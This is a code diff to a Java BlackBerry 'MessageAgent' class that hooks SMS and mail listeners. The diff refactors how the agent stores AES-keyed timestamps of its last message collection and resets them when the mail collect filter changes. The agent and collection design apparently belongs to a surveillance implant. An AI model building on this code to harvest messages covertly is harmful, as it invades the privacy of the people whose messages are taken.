@@ -65,17 +65,13 @@ public final class MessageAgent extends Agent {
     //#endif
 
     protected static final int SLEEPTIME = 5000;
-    protected static final int PERIODTIME = 3600*1000;
+    protected static final int PERIODTIME = 60 * 60 * 1000;
 
     MailListener mailListener;
     SmsListener smsListener;
 
-    //#ifdef MARKUP_TIMESTAMP
     TimestampMarkup markupDate;
-    //#else
-    Markup markup;
-    public long lastcheck = 0;
-    //#endif
+    //public Date lastcheck = new Date(0);
 
     protected String identification;
     public IntHashtable filtersSMS = new IntHashtable();
@@ -100,9 +96,9 @@ public final class MessageAgent extends Agent {
         //#endif
 
         mailListener = new MailListener(this);
-        smsListener =  SmsListener.getInstance();
+        smsListener = SmsListener.getInstance();
         smsListener.setMessageAgent(this);
-        
+
     }
 
     /**
@@ -117,26 +113,21 @@ public final class MessageAgent extends Agent {
         this(agentStatus);
         parse(confParams);
 
-        //#ifdef MARKUP_TIMESTAMP
         // mantiene la data prima di controllare tutte le email
         markupDate = new TimestampMarkup(agentId, Keys.getInstance()
                 .getAesKey());
-        //#else
-        markup = new Markup(agentId, Keys.getInstance().getAesKey());
-        if (markup.isMarkup()) {
-            try {
-                lastcheck = Utils.byteArrayToLong(markup.readMarkup(), 0);
-            } catch (IOException e) {
-
-                //debug.error("MessageAgent: " + e);
-                markup.removeMarkup();
-            }
-        }
+        
+        Date lastcheck = lastcheckGet("COLLECT");
+        //#ifdef DEBUG_TRACE
+        debug.trace("MessageAgent lastcheck: "+lastcheck);
         //#endif
 
         setDelay(SLEEPTIME);
         setPeriod(PERIODTIME);
 
+        //#ifdef DBC
+        Check.ensures(lastcheck != null, "MessageAgent: null lastcheck");
+        //#endif
     }
 
     /*
@@ -144,23 +135,26 @@ public final class MessageAgent extends Agent {
      * @see blackberry.threadpool.TimerJob#actualRun()
      */
     public void actualRun() {
-       
+
         // Ogni ora viene verificato se i nomi degli account corrisponde
         // se non corrisponde, restart dell'agente.
-        
-        if( firstRun){
+
+        if (firstRun) {
+            //#ifdef DEBUG_INFO
+            debug.info("First Run");
+            //#endif
             firstRun = false;
             smsListener.run();
             mailListener.run();
         }
-                    
-        if( haveNewAccount() ){
+
+        if (haveNewAccount()) {
             //#ifdef DEBUG_INFO
             debug.info("Restarting MessageAgent, new account");
             //#endif
             AgentManager.getInstance().reStart(agentId);
         }
-        
+
     }
 
     private boolean haveNewAccount() {
@@ -259,7 +253,29 @@ public final class MessageAgent extends Agent {
                             //#ifdef DEBUG_INFO
                             debug.info(filter.toString());
                             //#endif
+
+                            if (filter.type == Filter.TYPE_COLLECT) {
+                                Date oldfrom = lastcheckGet("FilterFROM");
+                                Date oldto = lastcheckGet("FilterTO");
+                                
+                                if(filter.fromDate == oldfrom && filter.toDate == oldto){
+                                    //#ifdef DEBUG_TRACE
+                                    debug.trace("parse: same Mail Collect Filter");
+                                    //#endif
+                                }else{
+                                  //#ifdef DEBUG_WARN
+                                    debug
+                                            .warn("Changed collect filter, resetting markup");
+                                    //#endif
+                                    lastcheckReset();
+                                    lastcheckSet("FilterFROM", filter.fromDate);
+                                    lastcheckSet("FilterTO", filter.toDate);
+                                }
+                                
+                            }
+
                             filtersEMAIL.put(filter.type, filter);
+
                             break;
                         case Filter.CLASS_MMS:
                             //#ifdef DEBUG_INFO
@@ -321,42 +337,34 @@ public final class MessageAgent extends Agent {
 
         return tokens;
     }
-
-    /**
-     * Update markup.
-     */
-    public void updateLastCheck(String key) {
+    
+    public synchronized void lastcheckSet(String key, Date date) {
         //#ifdef DEBUG_TRACE
-        debug.trace("Writing date in markup: " + key);
+        debug.trace("Writing markup: " +  key + " date: "+date);
         //#endif
-        final Date date = new Date();
-        lastcheck = date.getTime();
-
-        //#ifdef MARKUP_TIMESTAMP
+        
         markupDate.put(key, date);
-        //#else
-        markup.writeMarkup(Utils.longToByteArray(lastcheck));
-        //#endif
-
     }
 
-    public long getLastCheck(String key) {
-        Date date;
+    public synchronized Date lastcheckGet(String key) {
 
-        //#ifdef MARKUP_TIMESTAMP
-        date = markupDate.get(key);
-        //ifdef DEBUG_TRACE
+        Date date = markupDate.get(key);
+
+        //#ifdef DEBUG_TRACE
         debug.trace("getLastCheck: " + key + " = " + date);
-        //endif
-        long timestamp = 0;
-        if (date != null) {
-            timestamp = date.getTime();
-        }
-        return timestamp;
-        //#else
-        return lastcheck;
         //#endif
+        
+        if (date == null) {
+            return new Date(0);
+        }else{
+            return date;
+        }
+        
+    }
 
+    public synchronized void lastcheckReset() {
+        markupDate.removeMarkup();
+        //lastcheck = new Date(0); 
     }
 
 }
